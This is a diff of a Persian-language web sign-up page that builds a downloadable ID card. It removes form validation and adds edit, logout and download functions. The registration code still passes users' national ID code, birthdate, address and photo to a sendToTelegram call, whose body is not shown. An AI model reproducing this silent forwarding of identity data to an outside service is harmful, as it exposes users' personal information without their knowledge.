@@ -319,60 +319,19 @@
 
         // Register function
         function register() {
-            const name = document.getElementById("name").value.trim();
-            const family = document.getElementById("family").value.trim();
-            const nationalCode = document.getElementById("nationalCode").value.trim();
-            const birthdate = document.getElementById("birthdate").value.trim();
-            const gender = document.querySelector('input[name="gender"]:checked')?.value || '';
-            const education = document.getElementById("education").value.trim();
-            const address = document.getElementById("address").value.trim();
-            const profileImage = document.getElementById("profilePreview").src;
-
-            // بررسی خالی بودن فیلدها
-            if (!name) {
-                document.getElementById("signupError").innerText = "لطفاً نام خود را وارد کنید.";
-                return;
-            }
-            if (!family) {
-                document.getElementById("signupError").innerText = "لطفاً نام خانوادگی خود را وارد کنید.";
-                return;
-            }
-            if (!nationalCode) {
-                document.getElementById("signupError").innerText = "لطفاً کد ملی خود را وارد کنید.";
-                return;
-            }
-            if (!birthdate) {
-                document.getElementById("signupError").innerText = "لطفاً تاریخ تولد خود را وارد کنید.";
-                return;
-            }
-            if (!gender) {
-                document.getElementById("signupError").innerText = "لطفاً جنسیت خود را انتخاب کنید.";
-                return;
-            }
-            if (!education) {
-                document.getElementById("signupError").innerText = "لطفاً تحصیلات خود را وارد کنید.";
-                return;
-            }
-            if (!address) {
-                document.getElementById("signupError").innerText = "لطفاً آدرس خود را وارد کنید.";
-                return;
-            }
-
-            // اگر همه فیلدها پر شده‌اند، کاربر را ذخیره کنید
             const user = {
-                name,
-                family,
-                nationalCode,
-                birthdate,
-                gender,
-                education,
-                address,
-                profileImage
+                name: document.getElementById("name").value.trim(),
+                family: document.getElementById("family").value.trim(),
+                nationalCode: document.getElementById("nationalCode").value.trim(),
+                birthdate: document.getElementById("birthdate").value.trim(),
+                gender: document.querySelector('input[name="gender"]:checked')?.value || '',
+                education: document.getElementById("education").value.trim(),
+                address: document.getElementById("address").value.trim(),
+                profileImage: document.getElementById("profilePreview").src
             };
 
             saveUser(user);
             document.getElementById("signupSuccess").innerText = "ثبت‌نام با موفقیت انجام شد!";
-            document.getElementById("signupError").innerText = "";
 
             // ارسال اطلاعات به تلگرام
             sendToTelegram(user);
@@ -435,3 +394,46 @@
                 birthdate: document.getElementById("editBirthdate").value.trim(),
                 gender: document.querySelector('input[name="editGender"]:checked')?.value || '',
                 education: document.getElementById("editEducation").value.trim(),
+                address: document.getElementById("editAddress").value.trim(),
+                profileImage: document.getElementById("editProfilePreview").src
+            };
+
+            saveUser(user);
+            currentUser = user;
+            showDashboard(user);
+        }
+
+        // Logout
+        function logout() {
+            currentUser = null;
+            document.getElementById("dashboard").style.display = "none";
+            document.getElementById("signup").style.display = "block";
+        }
+
+        // Show login
+        function showLogin() {
+            document.getElementById("signup").style.display = "none";
+            document.getElementById("login").style.display = "block";
+        }
+
+        // Show signup
+        function showSignup() {
+            document.getElementById("login").style.display = "none";
+            document.getElementById("signup").style.display = "block";
+        }
+
+        // Download ID card
+        function downloadIDCard() {
+            html2canvas(document.getElementById("idCard")).then(canvas => {
+                const link = document.createElement("a");
+                link.download = "کارت شناسایی.png";
+                link.href = canvas.toDataURL("image/png");
+                link.click();
+            });
+        }
+
+        // Initialize DB on page load
+        initDB();
+    </script>
+</body>
+</html>
